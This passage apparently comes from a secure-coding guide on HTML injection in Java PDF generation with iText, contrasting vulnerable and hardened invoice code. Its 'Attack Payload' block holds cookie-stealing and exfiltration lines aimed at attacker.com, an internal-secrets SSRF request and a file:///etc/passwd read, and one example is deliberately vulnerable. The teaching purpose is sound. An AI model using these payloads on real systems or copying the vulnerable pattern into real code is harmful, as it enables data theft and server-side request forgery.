**Additional Protections**:
- **Template Approval Workflow**: User-created templates require admin review before activation
- **Content Security Policy**: Output rendered templates with strict CSP headers to mitigate XSS from stored templates
- **Version Control**: Track all template changes with audit trail for forensic analysis
- **Rate Limiting**: Limit template creation and render requests per user to prevent abuse
- **Sandbox Environment**: For high-risk use cases, render templates in isolated containers with no network access

PDF generation from user input is a critical security concern. Many PDF libraries interpret HTML/CSS, and malicious content can lead to XSS, SSRF, or even Remote Code Execution.

**VULNERABLE CODE**:

```java
import com.itextpdf.html2pdf.HtmlConverter;
import java.io.FileOutputStream;
import java.io.IOException;

public class InvoiceGenerator {

    public void generateInvoice(String customerName, String address, 
                                 String itemDescription, double amount) 
                                 throws IOException {

        // VULNERABLE: User input directly embedded in HTML
        String htmlContent = "<html><head><style>" +
            "body { font-family: Arial; }" +
            "</style></head><body>" +
            "<h1>Invoice</h1>" +
            "<p>Customer: " + customerName + "</p>" +
            "<p>Address: " + address + "</p>" +
            "<p>Item: " + itemDescription + "</p>" +
            "<p>Amount: $" + amount + "</p>" +
            "</body></html>";

        // Converts HTML to PDF - will execute embedded scripts/styles
        HtmlConverter.convertToPdf(htmlContent, 
            new FileOutputStream("/tmp/invoice.pdf"));
    }
}
```

**Attack Payload**:
```html
<img src="http://internal-server:8080/admin/api/secrets">
<link rel="stylesheet" href="http://attacker.com/exfil?data=sensitive">
<iframe src="file:///etc/passwd"></iframe>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Why This Is Dangerous**:
- User input is directly concatenated into HTML without sanitization
- PDF libraries often support external resource loading (SSRF attacks)
- Some libraries execute JavaScript or support `file://` protocol (local file disclosure)
- CSS can be used for data exfiltration via external fonts or background images
- HTML entities like `<iframe>` can access internal resources

**SECURE VERSION**:

```java
import com.itextpdf.html2pdf.ConverterProperties;
import com.itextpdf.html2pdf.HtmlConverter;
import com.itextpdf.styledxmlparser.resolver.resource.IResourceRetriever;
import org.owasp.encoder.Encode;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

public class SecureInvoiceGenerator {

    private static final int MAX_FIELD_LENGTH = 500;

    public void generateInvoice(String customerName, String address,
                                 String itemDescription, double amount)
                                 throws IOException {

        // DEFENSE 1: Input validation
        validateInput(customerName, "customerName");
        validateInput(address, "address");
        validateInput(itemDescription, "itemDescription");

        // DEFENSE 2: HTML entity encoding using OWASP Encoder
        String safeCustomerName = Encode.forHtmlContent(customerName);
        String safeAddress = Encode.forHtmlContent(address);
        String safeItemDescription = Encode.forHtmlContent(itemDescription);

        String htmlContent = "<html><head><style>" +
            "body { font-family: Arial, sans-serif; }" +
            "</style></head><body>" +
            "<h1>Invoice</h1>" +
            "<p>Customer: " + safeCustomerName + "</p>" +
            "<p>Address: " + safeAddress + "</p>" +
            "<p>Item: " + safeItemDescription + "</p>" +
            "<p>Amount: $" + String.format("%.2f", amount) + "</p>" +
            "</body></html>";

        // DEFENSE 3: Disable external resource loading
        ConverterProperties props = new ConverterProperties();
        props.setResourceRetriever(new BlockingResourceRetriever());

        HtmlConverter.convertToPdf(htmlContent,
            new FileOutputStream("/tmp/invoice.pdf"), props);
    }

    private void validateInput(String input, String fieldName) {
        if (input == null || input.isEmpty()) {
            throw new IllegalArgumentException(fieldName + " cannot be empty");
        }
        if (input.length() > MAX_FIELD_LENGTH) {
            throw new IllegalArgumentException(fieldName + " exceeds maximum length");
        }
    }

    // Custom resource retriever that blocks all external resources
    private static class BlockingResourceRetriever implements IResourceRetriever {
        @Override
        public InputStream getInputStreamByUrl(URL url) throws IOException {
            // Block all external resource requests
            throw new IOException("External resources are not allowed: " + url);
        }
    }
}
```

**Key Security Controls**:
- **OWASP Encoder**: Uses `Encode.forHtmlContent()` to properly escape HTML special characters, preventing script injection
- **Input Validation**: Enforces length limits and non-empty values to prevent buffer-based attacks
- **Resource Blocking**: Custom `IResourceRetriever` blocks all external HTTP requests, preventing SSRF attacks
- **No file:// access**: Blocking resource retrieval prevents local file disclosure

Allowing rich content in PDF generation requires a whitelist approach with strict controls. You must sanitize HTML while preserving safe formatting, and handle images through a secure proxy.

**PRODUCTION PATTERN**:

```java
import com.itextpdf.html2pdf.ConverterProperties;
import com.itextpdf.html2pdf.HtmlConverter;
import com.itextpdf.styledxmlparser.resolver.resource.IResourceRetriever;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.safety.Safelist;
import org.owasp.encoder.Encode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.URL;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.Pattern;

public class ProductionPdfGenerator {

    private static final Logger logger = LoggerFactory.getLogger(ProductionPdfGenerator.class);
    private static final int MAX_CONTENT_LENGTH = 50000;
    private static final int MAX_IMAGE_SIZE_BYTES = 5 * 1024 * 1024; // 5MB
    private static final Set<String> ALLOWED_IMAGE_TYPES = Set.of("image/png", "image/jpeg", "image/gif");
    private static final Pattern SAFE_FILENAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_-]+\\.(png|jpg|jpeg|gif)$");

    private final ImageStorageService imageStorage;
    private final RateLimiter rateLimiter;
    private final ExecutorService pdfExecutor;

    public ProductionPdfGenerator(ImageStorageService imageStorage) {
        this.imageStorage = imageStorage;
        this.rateLimiter = new RateLimiter(100, TimeUnit.MINUTES); // 100 PDFs per minute
        this.pdfExecutor = Executors.newFixedThreadPool(4);
    }

    public byte[] generateSecurePdf(PdfRequest request, String userId) 
            throws PdfGenerationException {

        String requestId = UUID.randomUUID().toString();
        long startTime = System.currentTimeMillis();

        try {
            // DEFENSE 1: Rate limiting per user
            if (!rateLimiter.tryAcquire(userId)) {
                logger.warn("Rate limit exceeded for user: {} requestId: {}", userId, requestId);
                throw new PdfGenerationException("Rate limit exceeded. Please try again later.");
            }

            // DEFENSE 2: Input validation
            validateRequest(request, requestId);

            // DEFENSE 3: Sanitize rich HTML content with whitelist
            String sanitizedContent = sanitizeHtmlContent(request.getContent());

            // DEFENSE 4: Process images through secure proxy
            Map<String, byte[]> processedImages = processImages(request.getImageReferences(), requestId);

            // DEFENSE 5: Build PDF with timeout protection
            byte[] pdfBytes = generateWithTimeout(sanitizedContent, processedImages, requestId);

            // Audit logging
            logger.info("PDF generated successfully. userId: {}, requestId: {}, size: {} bytes, duration: {}ms",
                userId, requestId, pdfBytes.length, System.currentTimeMillis() - startTime);

            return pdfBytes;

        } catch (TimeoutException e) {
            logger.error("PDF generation timeout. userId: {}, requestId: {}", userId, requestId);
            throw new PdfGenerationException("PDF generation timed out");
        } catch (Exception e) {
            logger.error("PDF generation failed. userId: {}, requestId: {}, error: {}", 
                userId, requestId, e.getMessage());
            throw new PdfGenerationException("Failed to generate PDF");
        }
    }

    private void validateRequest(PdfRequest request, String requestId) {
        if (request == null) {
            throw new IllegalArgumentException("Request cannot be null");
        }
        if (request.getContent() == null || request.getContent().length() > MAX_CONTENT_LENGTH) {
            logger.warn("Invalid content length. requestId: {}", requestId);
            throw new IllegalArgumentException("Content exceeds maximum allowed length");
        }
    }

    private String sanitizeHtmlContent(String untrustedHtml) {
        // WHITELIST APPROACH: Only allow specific safe tags and attributes
        Safelist safelist = new Safelist()
            .addTags("p", "br", "b", "strong", "i", "em", "u", "h1", "h2", "h3", 
                     "h4", "h5", "h6", "ul", "ol", "li", "table", "tr", "td", "th", 
                     "thead", "tbody", "span", "div")
            .addAttributes("span", "style")
            .addAttributes("div", "style")
            .addAttributes("td", "colspan", "rowspan")
            .addAttributes("th", "colspan", "rowspan")
            // Only allow safe CSS properties
            .addProtocols("a", "href"); // Intentionally NOT adding href to prevent links

        // Remove all protocols that could lead to SSRF or XSS
        // NO javascript:, data:, file:, http:, https: in attributes

        Document.OutputSettings outputSettings = new Document.OutputSettings()
            .prettyPrint(false)
            .charset("UTF-8");

        String cleanHtml = Jsoup.clean(untrustedHtml, "", safelist, outputSettings);

        // DEFENSE: Additional CSS sanitization - only allow safe properties
        cleanHtml = sanitizeCssStyles(cleanHtml);

        return cleanHtml;
    }

    private String sanitizeCssStyles(String html) {
        // Whitelist of safe CSS properties
        Set<String> allowedCssProperties = Set.of(
            "color", "background-color", "font-size", "font-weight", 
            "font-style", "text-align", "text-decoration", "margin", 
            "padding", "border", "width", "height"
        );

        // Remove any CSS that references URLs (could be SSRF)
        // Remove expressions, behaviors, imports
        return html.replaceAll("(?i)url\\s*\\(", "blocked(")
                   .replaceAll("(?i)expression\\s*\\(", "blocked(")
                   .replaceAll("(?i)@import", "@blocked")
                   .replaceAll("(?i)behavior\\s*:", "blocked:");
    }

    private Map<String, byte[]> processImages(List<String> imageRefs, String requestId) 
            throws IOException {

        Map<String, byte[]> images = new HashMap<>();

        if (imageRefs == null || imageRefs.isEmpty()) {
            return images;
        }

        for (String imageRef : imageRefs) {
            // DEFENSE: Only allow references to pre-uploaded, validated images
            if (!SAFE_FILENAME_PATTERN.matcher(imageRef).matches()) {
                logger.warn("Invalid image reference blocked. requestId: {}, ref: {}", 
                    requestId, imageRef);
                continue;
            }

            // Fetch from internal trusted storage only
            Optional<ImageData> imageData = imageStorage.getValidatedImage(imageRef);

            if (imageData.isPresent()) {
                ImageData img = imageData.get();

                // Validate image type and size
                if (!ALLOWED_IMAGE_TYPES.contains(img.getContentType())) {
                    logger.warn("Blocked image with invalid type. requestId: {}, type: {}", 
                        requestId, img.getContentType());
                    continue;
                }

                if (img.getData().length > MAX_IMAGE_SIZE_BYTES) {
                    logger.warn("Blocked oversized image. requestId: {}, size: {}", 
                        requestId, img.getData().length);
                    continue;
                }

                // Re-encode image to strip any embedded metadata/exploits
                byte[] sanitizedImage = reencodeImage(img.getData(), img.getContentType());
                images.put(imageRef, sanitizedImage);
            }
        }

        return images;
    }

    private byte[] reencodeImage(byte[] imageData, String contentType) throws IOException {
        // Re-encode image to strip EXIF, XMP, and potential exploits
        // Uses ImageIO to decode and re-encode
        javax.imageio.ImageIO.setUseCache(false);
        java.awt.image.BufferedImage image = javax.imageio.ImageIO.read(
            new ByteArrayInputStream(imageData));

        if (image == null) {
            throw new IOException("Invalid image data");
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        String format = contentType.contains("png") ? "png" : "jpg";
        javax.imageio.ImageIO.write(image, format, baos);

        return baos.toByteArray();
    }

    private byte[] generateWithTimeout(String htmlContent, Map<String, byte[]> images, 
                                        String requestId) throws Exception {

        Future<byte[]> future = pdfExecutor.submit(() -> {
            ByteArrayOutputStream pdfOutput = new ByteArrayOutputStream();

            ConverterProperties props = new ConverterProperties();
            props.setResourceRetriever(new InternalOnlyResourceRetriever(images));

            // Wrap content in safe template
            String fullHtml = buildSecureTemplate(htmlContent);

            HtmlConverter.convertToPdf(fullHtml, pdfOutput, props);
            return pdfOutput.toByteArray();
        });

        // DEFENSE: Timeout to prevent DoS via complex rendering
        return future.get(30, TimeUnit.SECONDS);
    }

    private String buildSecureTemplate(String sanitizedContent) {
        return "<!DOCTYPE html>" +
            "<html><head>" +
            "<meta charset='UTF-8'>" +
            "<style>" +
            "body { font-family: Arial, Helvetica, sans-serif; font-size: 12pt; }" +
            "table { border-collapse: collapse; }" +
            "td, th { border: 1px solid #ccc; padding: 8px; }" +
            "</style>" +
            "</head><body>" +
            sanitizedContent +
            "</body></html>";
    }

    // Resource retriever that only serves pre-validated internal images
    private static class InternalOnlyResourceRetriever implements IResourceRetriever {
        private final Map<String, byte[]> allowedResources;

        InternalOnlyResourceRetriever(Map<String, byte[]> allowedResources) {
            this.allowedResources = allowedResources;
        }

        @Override
        public InputStream getInputStreamByUrl(URL url) throws IOException {
            String path = url.getPath();
            String filename = path.substring(path.lastIndexOf('/') + 1);

            if (allowedResources.containsKey(filename)) {
                return new ByteArrayInputStream(allowedResources.get(filename));
            }

            // Block all other resource requests
            throw new IOException("Resource not allowed: " + url);
        }
    }
}
```

**Defense in Depth Layers**:

1. **HTML Sanitization with Jsoup Safelist**:
